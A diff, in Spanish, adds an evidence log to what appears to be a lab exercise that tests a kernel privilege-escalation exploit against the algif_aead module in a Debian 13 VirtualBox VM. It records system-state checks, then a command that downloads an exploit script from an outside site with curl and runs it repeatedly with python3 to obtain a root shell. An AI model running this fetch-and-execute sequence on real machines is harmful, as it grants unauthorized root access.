@@ -26,3 +26,43 @@ Archivo del exploit:
 
 Nota:
 El exploit se ejecuto en Debian 13 dentro de Oracle VirtualBox.
+
+cat >> evidence/hito2_root_shell.txt <<'EOF'
+
+=== COMANDOS REGISTRADOS EN HISTORIAL / USADOS PARA ESTA EVIDENCIA ===
+
+{
+  echo "=== HITO 2: ESTADO ANTES DEL EXPLOIT ===";
+  echo "Fecha:";
+  date;
+  echo "";
+  echo "Hostname:";
+  hostname;
+  echo "";
+  echo "Kernel:";
+  uname -r;
+  echo "";
+  echo "Usuario antes del exploit:";
+  whoami;
+  id;
+  echo "";
+  echo "Modulo algif_aead:";
+  lsmod | grep algif_aead || echo "algif_aead NO cargado";
+} | tee evidence/hito2_antes_exploit.txt
+
+curl -L https://copy.fail/exp -o copy_fail_exp.py
+ls -l copy_fail_exp.py
+wc -c copy_fail_exp.py
+head copy_fail_exp.py
+sha256sum copy_fail_exp.py
+
+python3 copy_fail_exp.py
+python3 copy_fail_exp.py
+python3 copy_fail_exp.py
+python3 copy_fail_exp.py
+
+cat ~/copy-fail-lab/evidence/hito2_root_shell.txt
+
+Nota:
+El historial confirma la descarga, revision y ejecucion del exploit. El archivo hito2_root_shell.txt ya existia y fue revisado con cat, pero el bloque exacto usado para crearlo no aparece completo en el historial pegado.
+EOF
